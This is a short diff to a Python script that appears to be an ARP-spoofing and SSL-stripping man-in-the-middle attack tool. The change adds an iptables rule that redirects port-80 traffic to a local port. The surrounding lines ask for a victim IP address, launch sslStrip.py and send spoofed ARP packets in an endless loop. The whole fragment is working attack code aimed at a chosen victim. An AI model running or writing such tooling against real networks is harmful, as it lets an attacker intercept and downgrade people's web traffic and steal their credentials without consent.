@@ -3,6 +3,7 @@ import os
 import subprocess
 import time
 
+os.system("sudo iptables -t nat -A PREROUTING -p tcp --destination-port 80 -j REDIRECT --to-port 20000")
 
 vIP = raw_input("Victim IP address?")
 
@@ -40,8 +41,3 @@ os.system("python sslStrip.py & disown")
 
 while True:
     sendARP()
-
-
-
-
-
